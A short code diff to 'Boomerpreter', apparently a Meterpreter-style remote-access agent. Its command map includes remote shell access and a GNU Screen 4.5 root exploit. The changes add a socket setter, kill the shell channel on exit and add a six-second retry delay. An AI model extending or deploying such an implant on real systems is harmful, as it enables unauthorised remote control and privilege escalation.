@@ -35,6 +35,9 @@ class Boomerpreter:
         "shell": "get_shell",
         "root_screen45": "exploit_screen45"
         }
+    
+    def set_socket(self, s):
+        self.socket = s
 
     def run(self):
         self.socket.send(self.platform_os.encode())
@@ -125,6 +128,10 @@ class Boomerpreter:
                     if len(recv) == 0:
                         break
                     if b"exit" in recv:
+                        try:
+                            channel.kill()
+                        except:
+                            pass
                         return None
                     channel.write(recv)
                 read = False
@@ -290,4 +297,4 @@ try:
     boomerpreter = Boomerpreter(s)
     boomerpreter.run()
 except:
-    pass
+    time.sleep(6)
